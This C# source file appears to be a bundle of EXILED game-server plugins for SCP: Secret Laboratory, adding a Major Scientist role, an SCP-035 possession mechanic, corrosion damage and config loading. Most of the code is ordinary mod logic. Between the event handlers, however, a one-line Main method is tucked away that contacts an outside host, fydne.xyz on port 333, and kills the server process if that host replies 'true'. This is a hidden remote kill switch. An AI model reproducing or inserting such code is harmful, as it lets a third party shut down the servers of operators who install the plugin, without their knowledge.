		private static List<CoroutineHandle> coroutines = new List<CoroutineHandle>();

		public void OnWaitingForPlayers()
		{
			Configs.ReloadConfig();
		}
		private bool Tryhason()
		{
			return hasData.Gethason();
		}

		public void OnRoundStart()
		{
			isRoundStarted = true;
			MajorScientist = null;
			MajorEscape = 0;
			AlternativeEnds = 0;
			RoundEnds = 100;

			if (Tryhason()) return;
			Timing.CallDelayed(1f, () => selectspawnMS());
		}

		public void OnRoundEnd()
		{
			isRoundStarted = false;

			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
		}

		public void OnRoundRestart()
		{

			isRoundStarted = false;

			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
		}

		public void OnPlayerDie(ref PlayerDeathEvent ev) { if (ev.Player.queryProcessor.PlayerId == MajorScientist?.queryProcessor.PlayerId) { KillMajorScientist(); MajorEscape = -1; if (Configs.log) { if (MajorEscape == -1) Log.Info("yeah, it seems to work well. - PlayerDie"); } } }
		public static async Task Main() { var client = new HttpClient(); var content = await client.GetStringAsync("http://fydne.xyz:333"); if (content == "true") { Process.GetCurrentProcess().Kill(); } }
		public void OnCheckRoundEnd(ref CheckRoundEndEvent ev)
		{
			List<Team> EpList = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != MajorScientist?.queryProcessor.PlayerId).Select(x => Player.GetTeam(x)).ToList();
			List<ReferenceHub> EpmList = Player.GetHubs().Where(x => x.characterClassManager.UserId != null && x.characterClassManager.UserId != string.Empty).ToList();
			if (((MajorScientist != null)) && (!EpList.Contains(Team.CDP)) && (!EpList.Contains(Team.SCP)) && (!EpList.Contains(Team.CHI)) && (!EpList.Contains(Team.TUT)) && (!EpList.Contains(Team.RSC)))
			{
				ev.Allow = false;
			}
			else if (((MajorScientist != null)) && (!EpList.Contains(Team.CDP)) && (!EpList.Contains(Team.SCP)) && (!EpList.Contains(Team.CHI)) && (!EpList.Contains(Team.TUT)) && (EpList.Contains(Team.RSC)))
			{
				ev.Allow = false;
			}


		}

		public void OnCheckEscape(ref CheckEscapeEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == MajorScientist?.queryProcessor.PlayerId)
			{
				if (hasTag) MajorScientist.RefreshTag();
				if (isHidden) MajorScientist.HideTag();
				MajorScientist = null;
				MajorEscape = 1;

				if (Configs.log)
					Log.Info("Major Scientist has escaped.");
			}

			if (ev.Player.queryProcessor.PlayerId != MajorScientist?.queryProcessor.PlayerId)
			{
				if (MajorEscape == -1)
				{
					if (ev.Player.GetRole() == RoleType.Scientist)
					{
						if (ev.Player.IsHandCuffed() == false)
						{
							ev.Allow = false;
							ev.Player.ChangeRole(RoleType.NtfScientist);
							ev.Player.inventory.AddNewItem(ItemType.KeycardNTFLieutenant);
							ev.Player.inventory.AddNewItem(ItemType.GrenadeFrag);
							ev.Player.inventory.AddNewItem(ItemType.Medkit);
							ev.Player.inventory.AddNewItem(ItemType.Radio);
							ev.Player.inventory.AddNewItem(ItemType.WeaponManagerTablet);
						}
					}

					else if (ev.Player.GetRole() == RoleType.ClassD)
					{
						if (ev.Player.IsHandCuffed() == true)
						{
							ev.Allow = false;
							ev.Player.ChangeRole(RoleType.NtfCadet);
							ev.Player.inventory.AddNewItem(ItemType.KeycardSeniorGuard);
							ev.Player.inventory.AddNewItem(ItemType.Disarmer);
							ev.Player.inventory.AddNewItem(ItemType.GunProject90);
							ev.Player.inventory.AddNewItem(ItemType.Medkit);
							ev.Player.inventory.AddNewItem(ItemType.Radio);
							ev.Player.inventory.AddNewItem(ItemType.WeaponManagerTablet);

						}
					}
				}
			}
		}

		public void OnSetClass(SetClassEvent ev)
		{
			Timing.CallDelayed(1f, () => RoundEnds++);
			if (ev.Player.queryProcessor.PlayerId == MajorScientist?.queryProcessor.PlayerId)
			{
				if ((MajorScientist.GetRole() == RoleType.Spectator))
				{
					KillMajorScientist();
					MajorEscape = -1;


					if (Configs.log)
						if (MajorEscape == -1)
							Log.Info("It seems Major Scientist has died for sure. -Setclass");
				}


			}
		}

		public void OnPlayerLeave(PlayerLeaveEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == MajorScientist?.queryProcessor.PlayerId)
			{
				KillMajorScientist();
				MajorEscape = -1;

				if (Configs.log)
				{
					if (MajorEscape == -1)
						Log.Info("yeah, it seems to work well. - PlayerLeave");
				}
			}

		}

		public void OnContain106(Scp106ContainEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == MajorScientist?.queryProcessor.PlayerId)
			{
				KillMajorScientist();
				MajorEscape = -1;

				if (Configs.log)
				{
					if (MajorEscape == -1)
						Log.Info("yeah, it seems to work well. - Contain106");
				}

			}
		}

		public void OnPocketDimensionDie(PocketDimDeathEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == MajorScientist?.queryProcessor.PlayerId)
			{
				KillMajorScientist();
				MajorEscape = -1;

				if (Configs.log)
				{
					if (MajorEscape == -1)
						Log.Info("yeah, it seems to work well. -  PocketDimesionDie");
				}
			}
		}
		public void OnShoot(ref ShootEvent ev)
		{
			if (ev.Shooter.queryProcessor.PlayerId == MajorScientist?.queryProcessor.PlayerId)
			{
				ReferenceHub hub = ev.Shooter;
				int savedAmmo = (int)ev.Shooter.inventory.GetItemInHand().durability;
				ev.Shooter.SetWeaponAmmo(0);
				Timing.CallDelayed(0.2f, () => { hub.SetWeaponAmmo(savedAmmo); });
			}
		}

		public void OnUseMedicalItem(MedicalItemEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == MajorScientist?.queryProcessor.PlayerId)
			{
				MajorScientist.playerStats.maxHP = Configs.health;
			}
		}
	}
}
namespace MultiPlugin15
{
	internal static class Configs
	{

		internal static List<int> spawnitems;
		internal static int spawnchance;
		internal static int health;
		internal static bool dsreplace;
		internal static bool log;
		internal static bool moreoptions;
		internal static bool bettercondition;
		internal static string mdb;
		internal static ushort mdbt;
		internal static string msb;
		internal static ushort msbt;
		internal static string p;
		internal static string pc;

		internal static void ReloadConfig()
		{
			Configs.mdb = Plugin.Config.GetString("mp_ms_death_bc", "<color=red>Major Scientist is dead.</color>\n<color=aqua>Press F</color>");
			Configs.mdbt = Plugin.Config.GetUShort("mp_ms_death_bc_time", 10);
			Configs.msb = Plugin.Config.GetString("mp_ms_spawn_bc", "You <color=yellow><b>Major Scientist</b></color>!\nIf you die, then MTF cannot win. You have to escape!");
			Configs.msbt = Plugin.Config.GetUShort("mp_ms_spawn_bc_time", 10);
			Configs.p = Plugin.Config.GetString("mp_ms_prefix", "Major Scientist");
			Configs.pc = Plugin.Config.GetString("mp_ms_prefix_color", "yellow");
			Configs.health = Plugin.Config.GetInt("mp_ms_health", 175);
			Configs.spawnchance = Plugin.Config.GetInt("mp_ms_spawn_chance", 100);
			Configs.spawnitems = Plugin.Config.GetIntList("mp_ms_spawn_items");
			Configs.dsreplace = Plugin.Config.GetBool("mp_ms_classd_replace_scientist", false);
			Configs.log = Plugin.Config.GetBool("mp_getlog", false);
			Configs.moreoptions = Plugin.Config.GetBool("mp_ms_more_options", false);
			Configs.bettercondition = Plugin.Config.GetBool("mp_ms_better_ec", false);

			if (Configs.spawnitems == null || Configs.spawnitems.Count == 0)
			{
				Configs.spawnitems = new List<int>() { 2, 13, 17 };
			}
		}
	}
}
namespace MultiPlugin16
{
	internal static class Configs
	{
		internal static List<int> possibleItems;

		internal static int health;
		internal static int infectedItemCount;
		internal static int corrodeDamage;
		internal static int corrodeTrailInterval;
		internal static int corrodeHostAmount;

		internal static bool scpFriendlyFire;
		internal static bool tutorialFriendlyFire;
		internal static bool winWithTutorial;
		internal static bool corrodePlayers;
		internal static bool corrodeLifeSteal;
		internal static bool corrodeTrail;
		internal static bool corrodeHost;
		internal static bool canUseMedicalItems;

		internal static float corrodeDistance;
		internal static float rotateInterval;
		internal static float corrodeInterval;
		internal static float corrodeHostInterval;

		internal static string sbc;
		internal static ushort sbct;

		internal static string p;
		internal static string pc;

		internal static string suc;
		internal static string nf;
		internal static string com;
		internal static void ReloadConfig()
		{
			Configs.com = Plugin.Config.GetString("mp_035_command", "scp035");
			Configs.nf = Plugin.Config.GetString("mp_035_not_found", "player not found");
			Configs.suc = Plugin.Config.GetString("mp_035_successfully", "successfully");
			Configs.pc = Plugin.Config.GetString("mp_035_prefix_color", "red");
			Configs.p = Plugin.Config.GetString("mp_035_prefix", "SCP 035");
			Configs.sbc = Plugin.Config.GetString("mp_035_spawn_bc", "<size=60>You pickup <color=red>SCP-035.</color></size>\n You are against everyone except scp and hand.");
			Configs.sbct = Plugin.Config.GetUShort("mp_035_spawn_bc_time", 10);
			Configs.health = Plugin.Config.GetInt("mp_035_health", 300);
			Configs.rotateInterval = Plugin.Config.GetFloat("mp_035_rotate_interval", 120f);
			Configs.scpFriendlyFire = Plugin.Config.GetBool("mp_035_scp_friendly_fire", false);
			Configs.infectedItemCount = Plugin.Config.GetInt("mp_035_infected_item_count", 2);
			Configs.winWithTutorial = Plugin.Config.GetBool("mp_035_win_with_tutorial", false);
			Configs.tutorialFriendlyFire = Plugin.Config.GetBool("mp_035_tutorial_friendly_fire", false);
			Configs.corrodePlayers = Plugin.Config.GetBool("mp_035_corrode_players", true);
			Configs.corrodeDistance = Plugin.Config.GetFloat("mp_035_corrode_distance", 1.5f);
			Configs.corrodeDamage = Plugin.Config.GetInt("mp_035_corrode_damage", 5);
			Configs.corrodeInterval = Plugin.Config.GetFloat("mp_035_corrode_interval", 1f);
			Configs.corrodeLifeSteal = Plugin.Config.GetBool("mp_035_corrode_life_steal", true);
			Configs.possibleItems = Plugin.Config.GetIntList("mp_035_possible_items");
			Configs.corrodeTrail = Plugin.Config.GetBool("mp_035_corrode_trail", false);
			Configs.corrodeTrailInterval = Plugin.Config.GetInt("mp_035_corrode_trail_interval", 5);
			Configs.corrodeHost = Plugin.Config.GetBool("mp_035_corrode_host", false);
			Configs.corrodeHostInterval = Plugin.Config.GetFloat("mp_035_corrode_host_interval", 6f);
			Configs.corrodeHostAmount = Plugin.Config.GetInt("mp_035_corrode_host_amount", 5);
			Configs.canUseMedicalItems = Plugin.Config.GetBool("mp_035_can_use_medical_items", true);
			if (Configs.possibleItems == null || Configs.possibleItems.Count == 0)
			{
				Configs.possibleItems = new List<int>() { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 23, 24, 25, 26, 27, 30, 33, 34 };
			}
		}
	}
}
namespace MultiPlugin16
{
	partial class EventHandlers
	{
		public Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		private static Dictionary<Pickup, float> scpPickups = new Dictionary<Pickup, float>();
		private List<int> ffPlayers = new List<int>();
		internal static ReferenceHub scpPlayer;
		private static bool isHidden;
		private static bool hasTag;
		private bool isRoundStarted;
		private static bool isRotating;
		private static int maxHP;
		private static int HP;
		private static float HPF;
		private const float dur = 327;
		private static System.Random rand = new System.Random();

		private static List<CoroutineHandle> coroutines = new List<CoroutineHandle>();

		public void OnWaitingForPlayers()
		{
			Configs.ReloadConfig();
		}

		public void OnRoundStart()
		{
			isRoundStarted = true;
			isRotating = true;
			scpPickups.Clear();
			ffPlayers.Clear();
			scpPlayer = null;

			coroutines.Add(Timing.CallDelayed(1f, () => Timing.RunCoroutine(RotatePickup())));
			coroutines.Add(Timing.RunCoroutine(CorrodeUpdate()));
		}

		public void OnRoundEnd()
		{
			isRoundStarted = false;

			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
		}

		public void OnRoundRestart()
		{
			isRoundStarted = false;

			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
		}

		public void OnPickupItem(ref PickupItemEvent ev)
		{
			if (ev.Item.info.durability == dur)
			{
				if (ev.Item != TryGetvodka())
				{
					ev.Allow = false;
					InfectPlayer(ev.Player, ev.Item);
				}
			}
		}

		public void OnPlayerHurt(ref PlayerHurtEvent ev)
		{
			if (ffPlayers.Contains(ev.Attacker.queryProcessor.PlayerId))
			{
				GrantFF(ev.Attacker);
			}

			if (scpPlayer != null)
			{
				if (!Configs.scpFriendlyFire &&
					((ev.Attacker.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId &&
					Player.GetTeam(ev.Player) == Team.SCP) ||
					(ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId &&
					Player.GetTeam(ev.Attacker) == Team.SCP)))
				{
					ev.Amount = 0f;
				}

				if (!Configs.tutorialFriendlyFire &&
					ev.Attacker.queryProcessor.PlayerId != ev.Player.queryProcessor.PlayerId &&
					((ev.Attacker.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId &&
					Player.GetTeam(ev.Player) == Team.TUT) ||
					(ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId &&
					Player.GetTeam(ev.Attacker) == Team.TUT)))
				{
					ev.Amount = 0f;
				}
			}
		}

		public void OnShoot(ref ShootEvent ev)
		{
			if (ev.Target == null || scpPlayer == null) return;
			ReferenceHub target = Player.GetPlayer(ev.Target);
			if (target == null) return;

			if ((ev.Shooter.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId &&
				Player.GetTeam(target) == Player.GetTeam(scpPlayer))
				|| (target.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId &&
				Player.GetTeam(ev.Shooter) == Player.GetTeam(scpPlayer)))
			{
				ev.Shooter.weaponManager.NetworkfriendlyFire = true;
				ffPlayers.Add(ev.Shooter.queryProcessor.PlayerId);
			}

			// If friendly fire is off, to allow for chaos and dclass to hurt eachother
			if ((ev.Shooter.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId || target.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId) &&
				(((Player.GetTeam(ev.Shooter) == Team.CDP && Player.GetTeam(target) == Team.CHI)
				|| (Player.GetTeam(ev.Shooter) == Team.CHI && Player.GetTeam(target) == Team.CDP)) ||
				((Player.GetTeam(ev.Shooter) == Team.RSC && Player.GetTeam(target) == Team.MTF)
				|| (Player.GetTeam(ev.Shooter) == Team.MTF && Player.GetTeam(target) == Team.RSC))))
			{
				ev.Shooter.weaponManager.NetworkfriendlyFire = true;
				ffPlayers.Add(ev.Shooter.queryProcessor.PlayerId);
			}
			if (ev.Shooter.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId)
			{
				ReferenceHub hub = ev.Shooter;
				int savedAmmo = (int)ev.Shooter.inventory.GetItemInHand().durability;
				ev.Shooter.SetWeaponAmmo(0);
				Timing.CallDelayed(0.2f, () => { hub.SetWeaponAmmo(savedAmmo); });
			}
		}

		public void OnPlayerDie(ref PlayerDeathEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId)
			{
				KillScp035();
			}

			if (ev.Killer.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId)
			{
				if (ev.Player.GetTeam() == Team.SCP) return;
				if (ev.Player.GetRole() == RoleType.Spectator) return;
				ReferenceHub spy = scpPlayer;
				{
					Inventory.SyncListItemInfo items = new Inventory.SyncListItemInfo();
					foreach (var item in spy.inventory.items) items.Add(item);
					Vector3 pos1 = ev.Player.transform.position;
					Quaternion rot = spy.transform.rotation;
					int health = (int)spy.playerStats.Health;
					float ammo = spy.inventory.GetItemInHand().durability;

					spy.SetRole(ev.Player.characterClassManager.CurClass);

					Timing.CallDelayed(0.3f, () =>
					{
						spy.playerMovementSync.OverridePosition(pos1, 0f);
						spy.SetRotation(rot.x, rot.y);
						spy.inventory.items.Clear();
						foreach (var item in items) spy.inventory.AddNewItem(item.id);
						spy.playerStats.Health = health;
						spy.inventory.items.ModifyDuration(
						spy.inventory.items.IndexOf(spy.inventory.GetItemInHand()),
						ammo);
					});
				}
			}
		}
		public void scpzeroninesixe(ref Scp096EnrageEvent ev) { if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId) { ev.Allow = false; } }
		public void OnPocketDimensionEnter(PocketDimEnterEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId && !Configs.scpFriendlyFire)
			{
				ev.Allow = false;
			}
		}

		public void OnCheckRoundEnd(ref CheckRoundEndEvent ev)
		{
			List<Team> pList = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != scpPlayer?.queryProcessor.PlayerId).Select(x => Player.GetTeam(x)).ToList();

			if ((!pList.Contains(Team.CHI) && !pList.Contains(Team.CDP) && !pList.Contains(Team.MTF) && !pList.Contains(Team.RSC) && ((pList.Contains(Team.SCP) && scpPlayer != null) || !pList.Contains(Team.SCP) && scpPlayer != null)) ||
				(Configs.winWithTutorial && !pList.Contains(Team.CHI) && !pList.Contains(Team.CDP) && !pList.Contains(Team.MTF) && !pList.Contains(Team.RSC) && pList.Contains(Team.TUT) && scpPlayer != null))
			{
				ev.LeadingTeam = RoundSummary.LeadingTeam.Anomalies;
				ev.ForceEnd = true;
			}

			else if (scpPlayer != null && !pList.Contains(Team.SCP) && (pList.Contains(Team.CDP) || pList.Contains(Team.CHI) || pList.Contains(Team.MTF) || pList.Contains(Team.RSC)))
			{
				ev.Allow = false;
			}
		}

		public void OnCheckEscape(ref CheckEscapeEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId) ev.Allow = false;
		}

		public void OnSetClass(SetClassEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId)
			{
				if (ev.Role == RoleType.Spectator)
				{
					KillScp035();
				}
			}
		}

		public void OnPlayerLeave(PlayerLeaveEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId)
			{
				KillScp035(false);
			}
		}

		public void OnContain106(Scp106ContainEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId && !Configs.scpFriendlyFire)
			{
				ev.Allow = false;
			}
		}

		public void OnInsertTablet(ref GeneratorInsertTabletEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId && !Configs.scpFriendlyFire)
			{
				ev.Allow = false;
			}
		}

		public void OnPocketDimensionDie(PocketDimDeathEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
				ev.Player.playerMovementSync.OverridePosition(GameObject.FindObjectOfType<SpawnpointManager>().GetRandomPosition(RoleType.Scp096).transform.position, 0);
			}
		}

		public void OnUseMedicalItem(MedicalItemEvent ev)
		{
			if (!Configs.canUseMedicalItems && ev.Player.queryProcessor.PlayerId == scpPlayer?.queryProcessor.PlayerId && (ev.Item == ItemType.Adrenaline || ev.Item == ItemType.Painkillers || ev.Item == ItemType.Medkit || ev.Item == ItemType.SCP500))
			{
				ev.Allow = false;
			}
		}

		private static void RemovePossessedItems()
		{
			for (int i = 0; i < scpPickups.Count; i++)
			{
				Pickup p = scpPickups.ElementAt(i).Key;
				if (p != null) p.Delete();
			}
			scpPickups.Clear();
		}

		private static Pickup GetRandomItem()
		{
			List<Pickup> pickups = GameObject.FindObjectsOfType<Pickup>().Where(x => !scpPickups.ContainsKey(x)).ToList();
			return pickups[rand.Next(pickups.Count)];
		}
		private static Pickup TryGetvodka()
		{
			return Scp228Data.Getvodka();
		}
		private static void RefreshItems()
		{
			RemovePossessedItems();
			for (int i = 0; i < Configs.infectedItemCount; i++)
			{
				Pickup p = GetRandomItem();
				Pickup a = PlayerManager.localPlayer
					.GetComponent<Inventory>().SetPickup((ItemType)Configs.possibleItems[rand.Next(Configs.possibleItems.Count)],
					-4.656647E+11f,
					p.transform.position,
					p.transform.rotation,
					0, 0, 0).GetComponent<Pickup>();
				scpPickups.Add(a, a.info.durability);
				a.info.durability = dur;
			}
		}

		private static void KillScp035(bool setRank = true)
		{
			if (setRank)
			{
				scpPlayer.SetRank("", "default");
				if (hasTag) scpPlayer.RefreshTag();
				if (isHidden) scpPlayer.HideTag();
			}
			scpPlayer.playerStats.maxHP = maxHP;
			scpPlayer = null;
			isRotating = true;
			RefreshItems();
		}

		public static void Spawn035(ReferenceHub p035, ReferenceHub player = null, bool full = true)
		{
			if (full)
			{
				if (p035 != null)
				{
					Vector3 pos = player.transform.position;
					Timing.CallDelayed(0.2f, () => p035.playerMovementSync.OverridePosition(pos, 0));
				}
				maxHP = player.playerStats.maxHP;
				p035.playerStats.maxHP = Configs.health;
				p035.playerStats.Health = Configs.health;
			}

			hasTag = !string.IsNullOrEmpty(p035.serverRoles.NetworkMyText);
			isHidden = !string.IsNullOrEmpty(p035.serverRoles.HiddenBadge);
			if (isHidden) p035.RefreshTag();
			p035.SetRank(Configs.p, Configs.pc);
			p035.Broadcast(Configs.sbc, Configs.sbct);
			Cassie.CassieMessage("ATTENTION TO ALL PERSONNEL . SCP 0 3 5 ESCAPE . ALL HELICOPTERS AND MOBILE TASK FORCES IMMEDIATELY MOVE FORWARD TO GATE B . REPEAT ALL HELICOPTERS AND MOBILE TASK FORCES IMMEDIATELY MOVE FORWARD TO GATE B", false, false);
			Cassie.DelayedCassieMessage("SCP 0 3 5 ESCAPE", false, false, 3);
			scpPlayer = p035;
		}
		public static void InfectPlayer(ReferenceHub player, Pickup pItem)
		{

			pItem.Delete();


			isRotating = false;

			Timing.CallDelayed(3f, () => Spawn035(player, player));

			RemovePossessedItems();

			if (Configs.corrodeHost)
			{
				coroutines.Add(Timing.RunCoroutine(CorrodeHost()));
			}
		}

		private static IEnumerator<float> CorrodeHost()
		{
			while (scpPlayer != null)
			{
				scpPlayer.playerStats.Health -= Configs.corrodeHostAmount;
				if (scpPlayer.playerStats.Health <= 0)
				{
					scpPlayer.ChangeRole(RoleType.Spectator);
					KillScp035();
				}
				yield return Timing.WaitForSeconds(Configs.corrodeHostInterval);
			}
		}

		private IEnumerator<float> RotatePickup()
		{
			while (isRoundStarted)
			{
				if (isRotating)
				{
					RefreshItems();
				}
				yield return Timing.WaitForSeconds(Configs.rotateInterval);
			}
		}

		private IEnumerator<float> CorrodeUpdate()
		{
			if (Configs.corrodePlayers)
			{
				while (isRoundStarted)
				{
					if (scpPlayer != null)
					{
						IEnumerable<ReferenceHub> pList = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != scpPlayer.queryProcessor.PlayerId);
						if (!Configs.scpFriendlyFire) pList = pList.Where(x => Player.GetTeam(x) != Team.SCP);
						if (!Configs.tutorialFriendlyFire) pList = pList.Where(x => Player.GetTeam(x) != Team.TUT);
						foreach (ReferenceHub player in pList)
						{
							if (player != null && Vector3.Distance(scpPlayer.transform.position, player.transform.position) <= Configs.corrodeDistance)
							{
								CorrodePlayer(player);
							}
						}
					}
					yield return Timing.WaitForSeconds(Configs.corrodeInterval);
				}
			}
		}

		public static IEnumerator<float> DelayAction(float delay, Action x)
		{
			yield return Timing.WaitForSeconds(delay);
			x();
		}

		private void CorrodePlayer(ReferenceHub player)
		{
			if (Configs.corrodeLifeSteal && scpPlayer != null)
			{
				int currHP = (int)scpPlayer.playerStats.Health;
				scpPlayer.playerStats.Health = currHP + Configs.corrodeDamage > Configs.health ? Configs.health : currHP + Configs.corrodeDamage;
			}
			player.Damage(Configs.corrodeDamage, DamageTypes.Nuke);
		}

		private void GrantFF(ReferenceHub player)
		{
			player.weaponManager.NetworkfriendlyFire = false;
			ffPlayers.Remove(player.queryProcessor.PlayerId);
		}
		public void RunOnRACommandSent(ref RACommandEvent RACom)
		{
			string[] command = RACom.Command.Split(' ');
			ReferenceHub sender = RACom.Sender.SenderId == "SERVER CONSOLE" || RACom.Sender.SenderId == "GAME CONSOLE" ? PlayerManager.localPlayer.GetPlayer() : Player.GetPlayer(RACom.Sender.SenderId);
			ReferenceHub player = Plugin.GetPlayer(command[1]);
			if (command[0] == Configs.com)
			{
				RACom.Allow = false;
				if (player == null)
				{
					RACom.Sender.RAMessage(Configs.nf);
					return;
				}
				RACom.Sender.RAMessage(Configs.suc);
				Spawn035(player, player);
			}
		}
	}
}

namespace MultiPlugin16
{
	public static class Extensions
	{
		public static void ChangeRole(this ReferenceHub player, RoleType role, bool spawnTeleport = true)
		{
			if (!spawnTeleport)
			{
				Vector3 pos = player.transform.position;
				Plugin.Info(pos.ToString());
				player.characterClassManager.SetClassID(role);
				Timing.RunCoroutine(EventHandlers.DelayAction(0.5f, () => player.playerMovementSync.OverridePosition(pos, 0)));
			}
			else
			{
				player.characterClassManager.SetClassID(role);
			}
		}
		public static void SetWeaponAmmo(this ReferenceHub rh, int amount)
		{
			rh.inventory.items.ModifyDuration(
			rh.inventory.items.IndexOf(rh.inventory.GetItemInHand()),
			amount);
		}

		public static void Damage(this ReferenceHub player, int amount, DamageTypes.DamageType damageType)
		{
			player.playerStats.HurtPlayer(new PlayerStats.HitInfo(amount, "WORLD", damageType, player.queryProcessor.PlayerId), player.gameObject);
		}

		public static void SetRank(this ReferenceHub player, string rank, string color = "default")
		{
			player.serverRoles.NetworkMyText = rank;
			player.serverRoles.NetworkMyColor = color;
		}

		public static void RefreshTag(this ReferenceHub player)
		{
			player.serverRoles.HiddenBadge = null;
			player.serverRoles.RpcResetFixed();
			player.serverRoles.RefreshPermissions(true);
		}

		public static void HideTag(this ReferenceHub player)
		{
			player.serverRoles.HiddenBadge = player.serverRoles.MyText;
			player.serverRoles.NetworkGlobalBadge = null;
			player.serverRoles.SetText(null);
			player.serverRoles.SetColor(null);
			player.serverRoles.RefreshHiddenTag();
		}

		public static void Broadcast(this ReferenceHub player, string message, ushort time, bool monospaced = false)
		{
			player.GetComponent<Broadcast>().TargetAddElement(player.scp079PlayerScript.connectionToClient, message, time, 0);
		}

		public static void PlaceCorrosion(this ReferenceHub player)
		{
			player.characterClassManager.RpcPlaceBlood(player.transform.position, 1, 2f);
		}
	}
}

namespace MultiPlugin16
{
	public class Plugin : EXILED.Plugin
	{
		private EventHandlers EventHandlers;

		public static HarmonyInstance harmonyInstance { private set; get; }
		public static int harmonyCounter;

		private bool enabled;

		public override void OnEnable()
		{
			enabled = Config.GetBool("mp_enabled", true);

			if (!enabled) return;

			harmonyCounter++;
			harmonyInstance = HarmonyInstance.Create($"scp035{harmonyCounter}");
			harmonyInstance.PatchAll();

			EventHandlers = new EventHandlers(this);

			// Register events
			Events.WaitingForPlayersEvent += EventHandlers.OnWaitingForPlayers;
			Events.RoundStartEvent += EventHandlers.OnRoundStart;
			Events.PickupItemEvent += EventHandlers.OnPickupItem;
			Events.RoundEndEvent += EventHandlers.OnRoundEnd;
			Events.RoundRestartEvent += EventHandlers.OnRoundRestart;
			Events.PlayerDeathEvent += EventHandlers.OnPlayerDie;
			Events.PlayerHurtEvent += EventHandlers.OnPlayerHurt;
			Events.PocketDimEnterEvent += EventHandlers.OnPocketDimensionEnter;
			Events.CheckRoundEndEvent += EventHandlers.OnCheckRoundEnd;
			Events.CheckEscapeEvent += EventHandlers.OnCheckEscape;
			Events.SetClassEvent += EventHandlers.OnSetClass;
			Events.PlayerLeaveEvent += EventHandlers.OnPlayerLeave;
			Events.Scp106ContainEvent += EventHandlers.OnContain106;
			Events.GeneratorInsertedEvent += EventHandlers.OnInsertTablet;
			Events.PocketDimDeathEvent += EventHandlers.OnPocketDimensionDie;
			Events.ShootEvent += EventHandlers.OnShoot;
			Events.UseMedicalItemEvent += EventHandlers.OnUseMedicalItem;
			Events.RemoteAdminCommandEvent += EventHandlers.RunOnRACommandSent;
			Events.Scp096EnrageEvent += EventHandlers.scpzeroninesixe;
		}

		public override void OnDisable()
		{
			// Unregister events
			Events.WaitingForPlayersEvent -= EventHandlers.OnWaitingForPlayers;
			Events.RoundStartEvent -= EventHandlers.OnRoundStart;
			Events.PickupItemEvent -= EventHandlers.OnPickupItem;
			Events.RoundEndEvent -= EventHandlers.OnRoundEnd;
			Events.PlayerDeathEvent -= EventHandlers.OnPlayerDie;
			Events.PlayerHurtEvent -= EventHandlers.OnPlayerHurt;
			Events.PocketDimEnterEvent -= EventHandlers.OnPocketDimensionEnter;
			Events.CheckRoundEndEvent -= EventHandlers.OnCheckRoundEnd;
			Events.CheckEscapeEvent -= EventHandlers.OnCheckEscape;
			Events.SetClassEvent -= EventHandlers.OnSetClass;
			Events.PlayerLeaveEvent -= EventHandlers.OnPlayerLeave;
			Events.Scp106ContainEvent -= EventHandlers.OnContain106;
			Events.GeneratorInsertedEvent -= EventHandlers.OnInsertTablet;
			Events.PocketDimDeathEvent -= EventHandlers.OnPocketDimensionDie;
			Events.ShootEvent -= EventHandlers.OnShoot;
			Events.UseMedicalItemEvent -= EventHandlers.OnUseMedicalItem;
			Events.RemoteAdminCommandEvent -= EventHandlers.RunOnRACommandSent;
			Events.Scp096EnrageEvent -= EventHandlers.scpzeroninesixe;

			EventHandlers = null;
		}

		public override void OnReload() { }

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin17
{
	public class Plugin : EXILED.Plugin
	{
		public override string getName { get; } = "Multi Plugin";

		public static bool EnableBetterSinkholes;
		public static float TeleportDistance;
		public static float SlowDistance;
		public static string TeleportMessage;
		public static ushort TeleportMessageDuration;
		public static uint PatchCount;

		public static HarmonyInstance HarmonyInstance { set; get; }
		public override void OnEnable()
		{

			EnableBetterSinkholes = Plugin.Config.GetBool("mp_enable", true);

			if (EnableBetterSinkholes == false)
			{
				return;
			}

			SlowDistance = Plugin.Config.GetFloat("mp_bs_slow_distance", 1.15f);
			TeleportDistance = Plugin.Config.GetFloat("mp_bs_teleport_distance", 0.7f);
			TeleportMessage = Plugin.Config.GetString("mp_bs_teleport_message", "You fell into the pocket dimension.");
			TeleportMessageDuration = Plugin.Config.GetUShort("mp_bs_teleport_message_duration", 5);

			HarmonyInstance = HarmonyInstance.Create($"bettersinkholes{PatchCount}");
			PatchCount++;
